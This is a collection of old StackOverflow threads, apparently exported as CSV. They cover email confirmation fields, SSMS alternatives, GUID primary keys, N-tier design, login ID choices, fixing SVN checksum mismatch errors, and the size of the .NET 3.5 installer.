<p>One more thing that I would add is that the second field should have the auto-complete feature disabled.  This ensures that there is human input from either method on at least one of the fields.</p> <p>I'd say that this is ok but should only be reserved for forms where the email is essential. If you mistype your email for your flight booking then you have severed the two-way link between yourself and the other party and risk not getting the confirmation number, here on StackOverflow it would only mean your Gravatar would not be loaded ...</p>

<p>I'd consider myself fairly techie but I always fill in both fields /wo cut-paste if I regard it to be important enough.</p> <p>As long as a field is viewable, you do not need a confirm box. As long as you do some form validation to be sure that  it is at least in valid format for an email address let the user manage the rest of the issues.</p> <p>I've seen plenty of people type their email address wrong and I've also looked through user databases full of invalid email address.</p>

<p>The way I see it you've got two options.  Use a second box to confirm the input, or send an authentication/activation email.</p>

<p>Both are annoyances so you get to choose which you think will annoy your users less.</p>

<p>Most would argue that having to find an email and click on a link is more annoying, but it avoids the copy/paste a bad address issue, and it allows you to do things like delete or roll back users if they don't activate after say 48 hours.</p> <p>While the more tech-savvy people tend to copy and paste, not technical people find it just as annoying to have to type something twice. During a lot of user testing I've down, the less tech-savvy - the more annoyed they seem with something like this... They struggle to type as it is, when they see they have to type their email in again it's usually greeted with a strong sign.</p>

<p>I would suggested a few things.</p>

<ol>
<li><p>Next to the input box write the style of the information you are looking for so something like <em>(i.e. user@domain.com)</em>. The reason this is important is you would be surprised how many of the less tech-savvy don't really understand the different between a website and an email address, so let them know visually the format you want.</p></li>
<li><p>Run strong formatting test in real time, and visually show a user that the format is good or bad. A green check box if everything is okay comes to mind.</p></li>
<li><p>Lastly, depending on your system architecture I often use a library to actually wrong a domain in the background. I don't necessarily try to run a VRFY on the server - I often use a library to check to make sure the domain they entered has MX records in it's DNS record.</p></li>
</ol>
 <p>Typing things twice is frustrating and doesn't prevent copy&amp;paste errors or even some typos.</p>

<p>I would use an authenticate/activate schema with a roll back to the old address if the activation is not met within 48 hours or if the email bounces.</p>
 <p>I tend to have it send a verification code to the email address specified (and only ask for it once), and not change the email address until the user has entered the code I sent them.</p>

<p>This has the advantage that if they try to set it to a dozen different addresses in quick succession, you'll know which ones work by which verification code they put in.</p>

<p>Plus, if I am presented with a ""confirm email address"" box, I just copy and paste from the previous one, and if I'm guilty of that, I'm sure that other less careful users will do the same.</p>
"
"SQL Server Management Studio alternatives to browse/edit tables and run queries <p>I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?</p>

<p>Not there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.</p>
 <p><a href=""http://toadworld.com/"">TOAD for MS SQL</a> looks pretty good.  I've never used it personally but I have used Quest's other products and they're solid.</p>
 <p>There is an <a href=""http://www.microsoft.com/downloads/details.aspx?FamilyId=C243A5AE-4BD1-4E3D-94B8-5A0F62BF7796&amp;displaylang=en"" rel=""nofollow"">express version on SSMS</a> that has considerably fewer features but still has the basics.</p>
 <p>I've started using <a href=""http://www.linqpad.net/"">LinqPad</a>. In addition to being more lightweight than SSMS, you can also practice writing LINQ queries- way more fun than boring old TSQL!</p> <P>If you are already spending time in Visual Studio, then you can always use the <STRONG>Server Explorer</STRONG> to connect to any .Net compliant database server.</P>
<P>Provided you're using Professional or greater, you can create and edit tables and databases, run queries, etc.</P> <p>You can still install and use Query Analyzer from previous SQL Server versions.</p>
 <p>Oracle has a free program called SQL Developer which will work with Microsoft SQL Server as well as Oracle &amp; MySQL.  When accessing SQL Server, however, Oracle SQL Developer is only intended to enable an easy migration to Oracle, so your SQL Server database is essentially read-only.</p>
 <p><a href=""http://www.microsoft.com/windowsserver2003/technologies/management/powershell/download.mspx"">powershell</a> + <a href=""http://msdn.microsoft.com/en-us/library/ms162773.aspx"">sqlcmd</a> :)</p>
 <p>Seems that no one mentioned <a href=""http://www.albahari.com/queryexpress.aspx"">Query Express</a> (http://www.albahari.com/queryexpress.aspx) and a fork <a href=""http://sourceforge.net/projects/queryexplus/"">Query ExPlus</a> (also link at the bottom of <a href=""http://www.albahari.com/queryexpress.aspx"">http://www.albahari.com/queryexpress.aspx</a>)</p>

<p>BTW. First URL is the home page of Joseph Albahari who is the author of LINQPad (check out this killer tool)</p>
 <p><a href=""http://fishcodelib.com/Database.htm"">Database .NET</a></p>
 <p>vim + <a href=""http://www.vim.org/scripts/script.php?script_id=356"" rel=""nofollow"">dbext</a> :)</p>
 <p>I have been using <a href=""http://www.atlantis-interactive.co.uk/products/sqleverywhere/default.aspx"" rel=""nofollow"">Atlantis SQL Enywhere</a>, a free software, for almost 6 months and has been working really well. Works with SQL 2005 and SQL 2008 versions. I am really impressed with its features and keyboard shortcuts are similar to VS, so makes the transition really smooth to a new editor.</p>

<p>Some of the features that are worth mentioning:</p>

<ul>
<li>Intellisense that actually works when using multiple tables and joins with aliases  </li>
<li>Suggestion of joins when using multiple tables (reduces time on typing, really neat)  </li>
<li>Rich formatting of sql code, AutoIndent using Ctrl K, Ctrl D.  </li>
<li>Better representation of SQL plans  </li>
<li>Highlights variables declarations while they are used.  </li>
<li>Table definition on mouse hover.  </li>
</ul>

<p>All these features have saved me lot of time.</p>
 <p>How about Embarcadero <a href=""http://www.embarcadero.com/products/rapid-sql-xe3"" rel=""nofollow"">Rapid SQL</a> Really good but kind of expensive.</p>
"
"Tables with no Primary Key <p>I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.</p>

<p>I'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (""identity"") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.</p>

<p>My database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.</p>

<p>What are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?</p>
 <p>I too have always heard having an auto-incrementing int is good for performance even if you don't actually use it.</p> <p>When dealing with indexes, you have to determine what your table is going to be used for.  If you are primarily inserting 1000 rows a second and not doing any querying, then a clustered index is a hit to performance.  If you are doing 1000 queries a second, then not having an index will lead to very bad performance.  The best thing to do when trying to tune queries/indexes is to use the Query Plan Analyzer and SQL Profiler in SQL Server.  This will show you where you are running into costly table scans or other performance blockers.</p>

<p>As for the GUID vs ID argument, you can find people online that swear by both.  I have always been taught to use GUIDs unless I have a really good reason not to.  Jeff has a good post that talks about the reasons for using GUIDs: <a href=""http://www.codinghorror.com/blog/archives/000817.html"">http://www.codinghorror.com/blog/archives/000817.html</a>.</p>

<p>As with most anything development related, if you are looking to improve performance there is not one, single right answer.  It really depends on what you are trying to accomplish and how you are implementing the solution.  The only true answer is to test, test, and test again against performance metrics to ensure that you are meeting your goals.</p>

<p>[Edit]
@Matt, after doing some more research on the GUID/ID debate I came across this post.  Like I mentioned before, there is not a true right or wrong answer.  It depends on your specific implementation needs.  But these are some pretty valid reasons to use GUIDs as the primary key:</p>

<blockquote>
  <p>For example, there is an issue known as a ""hotspot"", where certain pages of data in a table are under relatively high currency contention. Basically, what happens is most of the traffic on a table (and hence page-level locks) occurs on a small area of the table, towards the end. New records will always go to this hotspot, because IDENTITY is a sequential number generator. These inserts are troublesome because they require Exlusive page lock on the page they are added to (the hotspot). This effectively serializes all inserts to a table thanks to the page locking mechanism. NewID() on the other hand does not suffer from hotspots. Values generated using the NewID() function are only sequential for short bursts of inserts (where the function is being called very quickly, such as during a multi-row insert), which causes the inserted rows to spread randomly throughout the table's data pages instead of all at the end - thus eliminating a hotspot from inserts.</p>
  
  <p>Also, because the inserts are randomly distributed, the chance of page splits is greatly reduced. While a page split here and there isnt too bad, the effects do add up quickly. With IDENTITY, page Fill Factor is pretty useless as a tuning mechanism and might as well be set to 100% - rows will never be inserted in any page but the last one. With NewID(), you can actually make use of Fill Factor as a performance-enabling tool. You can set Fill Factor to a level that approximates estimated volume growth between index rebuilds, and then schedule the rebuilds during off-peak hours using dbcc reindex. This effectively delays the performance hits of page splits until off-peak times.</p>
  
  <p>If you even <em>think</em> you might need to enable replication for the table in question - then you might as well make the PK a uniqueidentifier and flag the guid field as ROWGUIDCOL. Replication will require a uniquely valued guid field with this attribute, and it will add one if none exists. If a suitable field exists, then it will just use the one thats there.</p>
  
  <p>Yet another huge benefit for using GUIDs for PKs is the fact that the value is indeed guaranteed unique - not just among all values generated by <em>this</em> server, but all values generated by <em>all</em> computers - whether it be your db server, web server, app server, or client machine. Pretty much every modern language has the capability of generating a valid guid now - in .NET you can use System.Guid.NewGuid. This is VERY handy when dealing with cached master-detail datasets in particular. You dont have to employ crazy temporary keying schemes just to relate your records together before they are committed. You just fetch a perfectly valid new Guid from the operating system for each new record's permanent key value at the time the record is created. </p>
  
  <p><a href=""http://forums.asp.net/t/264350.aspx"">http://forums.asp.net/t/264350.aspx</a></p>
</blockquote> <p>The primary key serves three purposes:</p>

<ul>
<li>indicates that the column(s) should be unique</li>
<li>indicates that the column(s) should be non-null</li>
<li>document the intent that this is the unique identifier of the row</li>
</ul>

<p>The first two can be specified in lots of ways, as you have already done.</p>

<p>The third reason is good:</p>

<ul>
<li>for humans, so they can easily see your intent</li>
<li>for the computer, so a program that might compare or otherwise process your table can query the database for the table's primary key.</li>
</ul>

<p>A primary key doesn't have to be an auto-incrementing number field, so I would say that it's a good idea to specify your guid column as the primary key.</p> <p>A Primary Key needn't be an autoincrementing field, in many cases this just means you are complicating your table structure.</p>

<p>Instead, a Primary Key should be the minimum collection of attributes (note that most DBMS will allow a composite primary key) that uniquely identifies a tuple.</p>

<p>In technical terms, it should be the field that every other field in the tuple is fully functionally dependent upon.  (If it isn't you might need to normalise).</p>

<p>In practice, performance issues may mean that you merge tables, and use an incrementing field, but I seem to recall something about premature optimisation being evil...</p> <p>Just jumping in, because Matt's baited me a bit.</p>

<p>You need to understand that although a clustered index is put on the primary key of a table by default, that the two concepts are separate and should be considered separately. A CIX indicates the way that the data is stored and referred to by NCIXs, whereas the PK provides a uniqueness for each row to satisfy the LOGICAL requirements of a table.</p>

<p>A table without a CIX is just a Heap. A table without a PK is often considered ""not a table"". It's best to get an understanding of both the PK and CIX concepts separately so that you can make sensible decisions in database design.</p>

<p>Rob</p>
 <p>Nobody answered actual question: what are pluses/minuses of a table with NO PK NOR a CLUSTERED index.
In my opinion, if you optimize for faster inserts (especially incremental bulk-insert, e.g. when you bulk load data into a non-empty table), such a table: with NO clustered index, NO constraints, NO Foreign Keys, NO Defaults and NO Primary Key, in a database with Simple Recovery Model, is the best. Now, if you ever want to query this table (as opposed to scanning it in its entirety) you may want to add a non-clustered non-unique indexes as needed but keep them to the minimum.</p>
 <p>Since you are doing replication, your are correct identities are something to stear clear of. I would make your GUID a primary key but nonclustered since you can't use newsequentialid. That stikes me as your best course. If you don't make it a PK but put a unique index on it, sooner or later that may cause people who maintain the system to not understand the FK relationships properly introducing bugs.</p>
"
"Are there any negative reasons to use an N-Tier solution? <p>I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our ""architect"" is suggesting we use one class project. Of course, I chime back with a ""3-tier"" architecture (Business, Data, Web class projects). </p>

<p>Is there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.</p> <p>it tends to take an inexperienced team longer to build 3-tier.It's more code, so more bugs. I'm just playing the devil's advocate though.</p> <p>I guess a fairly big downside is that the extra volume of code that you have to write, manage and maintain for a <strong>small</strong> project may just be overkill.</p>

<p>It's all down to what's appropriate for the size of the project, the expected life of the final project and the budget!  Sometimes, whilst doing things 'properly' is appealing, doing something a little more 'lightweight' can be the right commercial decision!</p>
 <P>I would be pushing hard for the N tiered approach even if it's a small project. If you use an ORM tool like codesmith + nettiers you will be able to quickly setup the projects and be developing code that solves your business problems quickly.</P>
<P>It kills me when you start a new project and you spend days sitting around spinning wheels talking about how the ""architecture"" should be architected. You want to be spending time solving the business problem, not solving problems that other people have solved for you. Using an ORM (it doesn't really matter which one, just pick one and stick to it) to help you get initial traction will help keep you focussed on the goals of the project and not distract you trying to solve ""architecture"" issues.</P>
<P>If, at the end of the day, the architect wants to go the one project approach, there is no reason you can't create an app_code folder with a BLL and DAL folder to seperate the code for now which will help you move to an N-Tiered solution later.</P> <p>As with anything abstraction creates complexity, and so the complexity of doing N-tiered should be properly justified, e.g., does N-tiered actually benefit the system? There <em>will</em> be small systems that will work best with N-tiered, although a lot of them will not.</p>

<p>Also, even if your system is small at the moment, you might want to add more features to it later -- not going N-tiered <em>might</em> consitute a sort of technical debt on your part, so you have to be careful.</p> <p>Because you want the <em>capability</em> of being able to distribute the layers onto different physical tiers (I always use ""tier"" for physical, and ""layer"" for logical), you should think twice before just putting everything into one class because you've got major refactorings to do if or when you do need to start distributing.</p>
 <p>The only disadvantage is complexity but really how hard is it to add some domain objects and bind to a list of them as opposed to using a dataset.  You don't even have to create three seperate projects, you can just create 3 seperate folders within the web app and give each one a namespace like, YourCompany.YourApp.Domain, YourCompany.YourApp.Data, etc.  </p>

<p>The big advantage is having a more flexible solution.  If you start writing your app as a data centric application, strongly coupling your web forms pages to datasets, you are going to end up doing a lot more work later migrating to a more domain centeric model as your business logic grows in complexity.  </p>

<p>Maybe in the short term you focus on a simple solution by creating very simple domain objects and populating them from datasets, then you can add business logic to them as needed and build out a more sophisticated ORM as needed, or use nhibernate.</p>
"
"What to use for login ID? <p>We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.</p>

<p>We want to move to a single namespace. But that brings the problem of unique user names.</p>

<p>So what's the best idea?</p>

<ul>
<li>Email address (w/verification) ?</li>
<li>Unique alpha-numeric string (""johnsmith9234"")?</li>
<li>Should we look at OpenID?</li>
</ul> <p>OpenID seems to be a very good alternative to writing your own user management/authentication piece.  I'm seeing more and more sites using OpenID these days, so the barrier to entry for your users should be relatively low.</p> <p>I like OpenID, but I'd still go with the email address, unless your user community is very technically savvy. It's still much easier for most people to understand and remember.</p> <p><strong>EMAIL ADDRESS</strong></p>

<p>Rational</p>

<ol>
<li>Users don't change emails very often</li>
<li>Removes the step of asking for username and email address, which you'll need anyway</li>
<li>Users don't often forget their email address (see number one)</li>
<li>Email will be unique unless the user already registered for the site, in which case forward them to a forgot your password screen</li>
<li>Almost everyone is using email as the primary login for access to a website, this means the rate of adoption shouldn't be affected by the fact that you're asking for an email address</li>
</ol>

<hr>

<p><strong>Update</strong></p>

<p>After registration, be sure to ask the user to create some kind of username, don't litter a public site with their email address! Also, another benefit of using an email address as a login: you won't need any other information (like password / password confirm), just send them a temp password through the mail, or forgo passwords altogether and send them a one-use URL to their email address every time they'd like to login (see: <a href=""http://mugshot.org/main"">mugshot.org</a>)</p> <p>I personally would say Email w/ Verification, OpenId is a great idea but I find that finding a provider that your already with is a pain, I only had an openId for here cause just 2 days before beta i decided to start a blog on blogspot. But everyone on the internet has en email address, especially when dealing with businesses, people aren't very opt to using there personal blog or whatnot for a business login.</p> <p>I think that OpenID is definitely worth looking at.  Besides giving you a framework in which to provide a unified id for customers, it can also provide large businesses with the ability to manage their own logins and provide a common login across all products that they use, including your own.  This isn't that large of a benefit now when OpenId is still relatively rare, but as more products begin to use it, I suspect that the ability to use a common company OpenId login for each employee could become a good selling point.</p>

<p>Since you're mostly catering to businesses, I don't think that it's all that unreasonable to offer to host the OpenId accounts yourself.  I just think that the extra flexibility will benefit your customers.</p> <p>OpenID is very slick, and something you should seriously consider as it basically removes the requirement to save local usernames and passwords and worry about authentication.</p>

<p>A lot of sites nowadays are using both OpenID and their own, giving users the option.</p>

<p>If you do decide to roll your own, I'd recommend using the email address. Be careful, though, if you are creating something that groups users by an account (say, a company that has several users). In this case, the email address might be used more than once (if they do work for more than one company, for example), and you should allow that.</p>

<p>HTH!</p> <p>If most of your customers are mostly businesses then I think that using anything other than email creates problems for your customers. Most people are comfortable with email address login and since they are a business customer will likely want to use their work email rather than a personal account. OpenID creates a situation where there is a third party involved and many businesses don't like a third party involved.</p> <p>Using OpenID seems like a particularly bad idea, it has serious security problems, and a fair amount of other issues too.</p>

<p>See: <a href=""http://idcorner.org/2007/08/22/the-problems-with-openid/"" rel=""nofollow"">http://idcorner.org/2007/08/22/the-problems-with-openid/</a></p>
 <p>If you use an email address for ID, don't require that it be verified. I learned the hard way about this when one day suddenly the number of signups at my site drastically decreased. It turns out that the entire range of IP addresses including my site's IP was blacklisted. It took a long time to resolve it. In other cases, I have seen Gmail marking very legitimate emails as spam, and that can cause trouble too.</p>

<p>It's good to verify the email address, but don't make it block signups.</p>
 <blockquote>
  <p>Right now our customers are mostly businesses.</p>
</blockquote>

<p>People seem to be missing that line. If it's for a business, requiring them to login via OpenID really isn't very practical. They'd either have to use an external OpenID provider, or their poor tech people would have to setup and configure a company OpenID.</p>

<p>If this were ""should StackOverflow require OpenID for login"" or ""Should my blog-comment-system allow you to identify yourself via OpenID"", my answer would be ""absolutely!"", but in this case, I don't think OpenID would be a good fit.</p>
 <p>If you are looking at OpenID you should check out <a href=""http://eaut.org/"" rel=""nofollow"">http://eaut.org/</a> and <a href=""http://emailtoid.net"" rel=""nofollow"">http://emailtoid.net</a>.  Basically you can accept email addresses for a login and behind the scenes translate them to OpenID without the user having to know anything.  Its pretty slick stuff...</p>
"
"Repair SVN Checksum <p>I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:</p>

<p><code>svn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'</code></p>

<p>I worked around it by:</p>

<ol>
<li>Committing all the other changed files, omitting the troublesome one.</li>
<li>Copying the contents of the trouble file to a TextMate window</li>
<li>Deleting my project in FlexBuilder/Eclipse</li>
<li>Checking my project out fresh from SVN</li>
<li>Copying the text of the trouble file back in from the TextMate Window</li>
<li>Committing the changes.</li>
</ol>

<p>It worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.</p>

<p>Maybe more important -- is this a symptom of a greater problem?</p>
 <p>The file in the .svn directory that keeps track of what you have checked out, when, what revision, and from where, has gotten corrupted somehow, for that particular file.</p>

<p>This is no more dangerous or critical than the normal odd file problem, and can be because of various problems, like a subversion program dying mid-change, power-disruption, etc.</p>

<p>Unless it happens more I wouldn't make much out of it.</p>

<p>It can be fixed by doing what you did, make a copy of your work-files, check out a fresh copy, and add the modified files back in.</p>

<p>Note that this might cause problems if you have a busy project where you would normally have to merge in changes.</p>

<p>For instance, you and a collegue both check out a fresh copy, and start working on the same file. At some point, your collegue checks in his modifications. When you attempt to do the same, you get the checksum problem you have. If you now make copies of your changed files, do a fresh checkout, then subversion will lose track of how your changes should be merged back in.</p>

<p>If you didn't get the problem in this case, when you got around to checkin in your modifications, you would need to update your working copy first, and possibly handle a conflict with your file.</p>

<p>However, if you do a fresh checkout, complete with your collegues changes, it now looks like you removed his changes and substituted with your own. No conflicts, and no indications from subversion that something is amiss.</p> <p>I occasionally get similar things, usually with files that nobody has been near in weeks. Generally, if you know you haven't been working in the directory in question, you can just delete the directory with the problem and run </p>

<pre><code>svn update<br></code></pre>

<p>to recreate it.</p>

<p>If you have live changes in the directory then as lassevk and you yourself suggested, a more careful approach is required.</p>

<p>Generally speaking I would say it's a good idea not to leave edited files uncommitted, and keep the working copy tidy - don't add a whole bunch of extra files into the working copy that you aren't going to use. Commit regularly, and then if the working copy goes tits up, you can just delete the whole thing and start over without worrying about what you might or might not be losing, and without the pain of trying to figure out what files to save. </p> <p>Just today, I managed to recover from this error by checking out a copy of the corrupted directory to /tmp and replacing the files in .svn/text-base with the just co'ed ones. I wrote up the procedure in some detail <strong><a href=""http://andrew.hedges.name/blog/2009/01/25/how-to-recover-from-checksum-mismatch-errors-in-svn"">here on my blog</a>.</strong> I'd be interested to hear from more experienced SVN users what are the advantages and disadvantages of each approach.</p>
 <p>SVN keeps pristine copies of all the files you checkout buried in the .svn directories.  This is called the text-base.  This allows for speedy diffs and reverts.  During various operations, SVN will do checksums on these text-base files to catch file corruption issues.</p>

<p>In general, an SVN checksum mismatch means a file that shouldn't have been altered was changed somehow.  What does that mean?</p>

<ol>
<li>Disk corruption (bad HDD or IDE cable)</li>
<li>Bad RAM</li>
<li>Bad network link</li>
<li>Some kind of background process altered a file behind your back (malware)</li>
</ol>

<p>All of these are bad.</p>

<p><strong>HOWEVER</strong>, I think your problem is different.  Look at the error message.  Note that it expected some MD5 hashes, but instead got back 'null'.  If this were a simple file corruption issue, I would expect that you would have two different MD5 hashes for the expected/got.  The fact that you have a 'null' implies that something else is wrong.</p>

<p>I have two theories:</p>

<ol>
<li>Bug in SVN.</li>
<li>Something had an exclusive lock on the file, and the MD5 couldn't happen.</li>
</ol>

<p>In the case of #1, try upgrading to the latest SVN version.  Maybe also post this on the svn-devel mailing list (<a href=""http://svn.haxx.se"">http://svn.haxx.se</a>), so the developers can see it.</p>

<p>In the case of #2, check to see if anything has the file locked.  You can download a copy of Process Explorer to check.  Note that you probably want to see who has a lock on the <strong>text-base</strong> file, not the actual file you were trying to commit.</p>
 <p>There's also a simpler cause for this  than just bugs, or disk corruption etc. I think it the most likely cause for this to happen is when someone writes a recursive text replacement on the working copy, without excluding .svn files.<br />
This means the pristine copies of the files (basically the BASE version of the files, that's stored inside the .svn administrative area) get modified, and that invalidates the MD5 sum.</p>

<p>@Andrew Hedges: that also explains why your solution fixes this.  </p>
 <p>try:
svn up --force file.c</p>

<p>This worked for me without having to do anything extra</p>
 <p>Had this issue, our dev VM's are all *nix our workstations win32.
some fool(s) created files of the same name (different case) on the *nix box
all of a sudden checkouts on Win32 blows up... 
because win doesn't know which of the 2 files of the same name to MD5 against, 
checkouts on *nix were fine... leaving us to scratch our heads for a bit</p>

<p>I was able to update the repo on the win box by copying the "".svn"" folders over from a *nix box with a good working copy. have yet to see if the repo can be cleaned to the point where we can do a full checkout again</p>
 <p>another, possibly even scarier, workaround for checksum conflicts i found is as follows:</p>

<p>CAVEAT: Make sure your local copy is the best known version, AND that anyone else on your project knows what you're doing!  (in case this wasn't obvious already).</p>

<p>if you know your local copy of the file is ""the good one"" you can directly delete the file from the SVN server and then force commit your local copy.  </p>

<p>syntax for direct deletion:</p>

<p>svn delete -m ""deleting corrupted file XXXX"" svn+ssh://username@svnserver/path/to/XXXX</p>

<p>good luck!</p>

<p>J</p>
 <p>here's how i fixed the issue - v simple, but as per jsh above, need to be sure your copy is the best one.</p>

<p>simply</p>

<ol>
<li>make a copy all problem files, in the same folder.</li>
<li>delete the old ones with svn rm</li>
<li>commit. </li>
<li>then rename the copies back to the original file names.</li>
<li>commit again.</li>
</ol>

<p>suspect this probably kills all sorts of revision history on that file, so it's a pretty ugly way to go about it...</p>
 <p>I've observed a lot of solutions from patching .svn/entries file to fresh checkout.</p>

<p>It can be a new way (thank to my collegue):</p>

<pre><code>- go to work directory where recorder/expected checksum issue occured
- call ""svn diff"" and make sure that there isnt any local modifications
- cd ..
- remove trouble file's directory with ""rm -rf""
- issue ""svn up"" command, svn client will restore new fresh files copies
</code></pre>
 <p>Matt, there is easier way than you described - modifying checksum in .svn/entries file. Here is full description:
<a href=""http://maymay.net/blog/2008/06/17/fix-subversion-checksum-mismatch-error-by-editing-svnentries-file/"" rel=""nofollow"">http://maymay.net/blog/2008/06/17/fix-subversion-checksum-mismatch-error-by-editing-svnentries-file/</a></p>
 <p>One other easy way....</p>

<ol>
<li>Update your project to get latest version</li>
<li>checkout the same version in an other folder</li>
<li>replace .svn folder from the new checkout to the working copy  ( i've replaced .svn-base files )</li>
</ol>
 <ol>
<li>Check out only folder with problematic file from repository to some other location.</li>
<li>Make sure <code>.svn\text-base\&lt;problematic file&gt;.svn-base</code> is identical to one checked out.</li>
<li>Make sure problematic file section <em>(all lines of the section)</em> in <code>.svn\entries</code> is identical to one checked out.</li>
</ol>
 <p>You won't believe this, but I have actually fixed my error by removing the <code>&lt;scm&gt;...&lt;/scm&gt;</code> stance from the offending pom.xml file I was hoping to check in. It contained the URL of the subversion repository it is checked in (this is what the Maven setting is for!), but somehow it generated a faulty checksum for the file while checking in.</p>

<p>I literally tried all aforementioned methods of fixing this, but to no avail. Did I encounter a very rare situation in where the checksum generator is not robust enough?</p>
 <p>I also stumbled upon this issue and was trying to look for quick solutions, tried some of the solution given in this thread.
This is how I resolved this issue in my development environment (to me it was minimal change):</p>

<p>1- Locally deleted directory in which the file got corrupted (WEB-INF):</p>

<pre><code> svn: Checksum mismatch for 'path-to-folder\WEB-INF\web.xml':
   expected:  d60cb051162e4a6790a3ea0c9ddfb434
     actual:  16885ded2cbc1adc250e4cbbc1427546
</code></pre>

<p>2- Copied and pasted directory (WEB-INF) from a fresh checkout </p>

<p>3- Did svn up, now Eclipse/TortoiseSVN started showing conflict in this directory</p>

<p>4- Marked conflict as Resolved</p>

<p>This worked, I was able to update, commit earlier corrupted web.xml</p>
 <p>In my case the sum was different. All I've done was:</p>

<p>1) Make Check Out to separate folder</p>

<p>2) Replace by file from this folder in .svn directory with my project problem-file which was said in svn-client error message </p>

<p>3) ..Profit!</p>
 <p>As an alternative to checking out a fresh copy (which I also had to do after trying all other options) and than merging all your changes which you previously saved backed into it, the following approach worked the same way, but saved me a considerable amount of time, and possibly some errors:</p>

<ol>
<li>Check out a fresh working copy</li>
<li>Copy .svn folder from you fresh copy into your corrupt copy</li>
<li>Voila</li>
</ol>

<p>Of course, you should backup your original corrupt working copy just in case. In my case, I was free to remove it after I was done, as everything went fine.</p>
 <p>1) Go to the folder causing problem
2) Execute command svn update --set-depth empty
3) This folder will empty and revert the empty folder.
4) sync with the svn and update.</p>

<p>This work for me.</p>
 <p>This will happens when the .svn folder corrupted.
Solution:
Remove the entire folder of the file contains and checkout the folder again.</p>
 <p>Although this is an old issue, I thought I would give my 2 cents as well, since Ive just wrestled with the problem for more than an hour.</p>

<p>The solutions above either didn't work for me, or seemed over-complicated.</p>

<p>My solution was simply to remove all svn folders from the project.</p>

<p><code>find . -name .svn -exec rm -rf {} \;</code></p>

<p>After this, I did simple checkout of the project again. Thus leaving all my un-committed files intact, but still got a rebuild of all the svn files.</p>
 <p>I had this problem on ubuntu 14.04 and solve it by follow steps:</p>

<ol>
<li>$ cd /var/www/myProject</li>
<li>$ svn upgrade</li>
<li>$ svn update</li>
</ol>

<p>after these steps i could commit file without error.</p>
"
".NET 3.5 Redistributable -- 200 MB? Other options? <P>I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps <EM>any version</EM>) of the .NET framework on their machines.</P>
<P>I went to go <A href=""http://www.microsoft.com/downloads/details.aspx?FamilyId=333325FD-AE52-4E35-B531-508D977D32A6&amp;displaylang=en"">download the .NET 3.5 redistributable package</A> only to find out that it's almost <STRONG><EM>200 MB!</EM></STRONG> This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our ""quick and painless"" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?</P> <p>That's one of the sad reasons i'm still targeting .net 2.0 whenever possible :/</p>

<p>But people don't neccessarily need the full 200 MB Package. There is a 3 MB Bootstrapper which will only download the required components:</p>

<p><a href=""http://www.microsoft.com/downloads/details.aspx?FamilyID=ab99342f-5d1a-413d-8319-81da479ab0d7&amp;DisplayLang=en"">.net 3.5 SP1 Bootstrapper</a></p>

<p>However, the worst case scenario is still a pretty hefty download. Also, see <a href=""http://blogs.msdn.com/astebner/archive/2008/01/10/7067719.aspx"">this article</a> for a more detailed explanation on the size and an alternative workaround to the size problem.</p>

<p>Addition: Since answering this question, Scott Hanselman created <a href=""http://www.smallestdotnet.com"">SmallestDotNet.com</a>, which will determine the smallest required download. Doesn't change the worst case scenario, but is still useful to know.</p>
 <p>Have you looked at the .NET Framework Client Profile? It is much smaller than the full redistributable package and is optimized for delivering just the functionality needed for smart clients.</p>

<p><a href=""http://blogs.windowsclient.net/trickster92/archive/2008/05/21/introducing-the-net-framework-client-profile.aspx"" rel=""nofollow"">Here is a nice overview.</a></p>

<p>I don't know if this will keep the download under two minutes or not, but it should get you quite a bit closer.</p> <p>Also, it is worth including (in some fashion) the Service Pack downloads as well. In fact, depending on how your executables are built, you might be forced to install the Framework and the Service Packs.</p> <p>Once .NET Framework 3.5 SP1 comes out (should be fairly soon) there will be a second option of frameworks, namely the ""Client Profile"", which is a cut-down framework that only weighs in about about 30Mb from memory. It doesn't include all of the namespaces and classes of the full framework, but should be enough for most common apps in theory. It can be upgraded to the full framework if necessary (eg. if an update to your software introduces a new dependency)</p>

<p>More more information, see here: <a href=""http://blogs.msdn.com/bclteam/archive/2008/05/21/net-framework-client-profile-justin-van-patten.aspx"" rel=""nofollow"">BCL Team blog</a></p> <p>For the record, .Net Framework 3.5 SP1 is required for Microsoft SQL Server 2008 to install and RTM'd around the same time as the release this week. Still a hefty install but you can extract the client profile from it. Just not to sure how.</p> <p>The Client Profile has got better (and smaller) in .NET 4 see </p>

<ul>
<li><a href=""http://www.hanselman.com/blog/TowardsASmallerNET4DetailsOnTheClientProfileAndDownloadingNET.aspx"" rel=""nofollow"">Towards a Smaller .NET 4 - Details on the Client Profile and Downloading .NET</a> </li>
<li><a href=""http://blogs.msdn.com/b/jgoldb/archive/2010/04/12/what-s-new-in-net-framework-4-client-profile-rtm.aspx"" rel=""nofollow"">What’s new in .NET Framework 4 Client Profile RTM</a></li>
